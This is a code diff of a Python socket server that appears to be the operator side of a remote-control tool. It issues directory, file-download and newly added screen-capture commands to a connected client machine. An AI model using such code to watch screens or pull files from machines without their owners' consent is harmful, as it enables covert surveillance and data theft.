@@ -1,12 +1,16 @@
-import threading
+import ctypes
 import socket
 from tools import *
 from termcolor import colored
+from screen import catch_screen_server
+import multiprocessing
+from term import clear_terminal
 
 host = "0.0.0.0"
 port = 8899
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
 server.bind((host, port))
 print(f'server listen on {host}:{port}.....')
 server.listen()
@@ -43,6 +47,7 @@ if __name__ == '__main__':
             continue
         if cmd == "exit":
             send_data(client, {"cmd": "exit"})
+            client.close()
             server.close()
             break
         if cmd == "ls":
@@ -59,6 +64,23 @@ if __name__ == '__main__':
                 work_dir = res["pwd"]
         if len(cmd.split(" ")) == 2 and cmd.split(" ")[0] == "download":
             download_file(client, cmd.split(" ")[1])
+        if cmd == "screen":
+            send_data(client, {"cmd": "screen"})
+            p = multiprocessing.Process(target=catch_screen_server)
+            p.start()
+            clear_terminal()
+            print(colored("screen capture started.....", color="blue"))
+            print(colored("input 'exit' to terminate", color="blue"))
+            while True:
+                print('>>>', end='')
+                command = str(input())
+                if command == "exit":
+                    send_data(client, {"cmd": "terminate"})
+                    p.terminate()
+                    print("screen capture terminated!")
+                    break
+                else:
+                    print("incurrent command!")
 
 
 
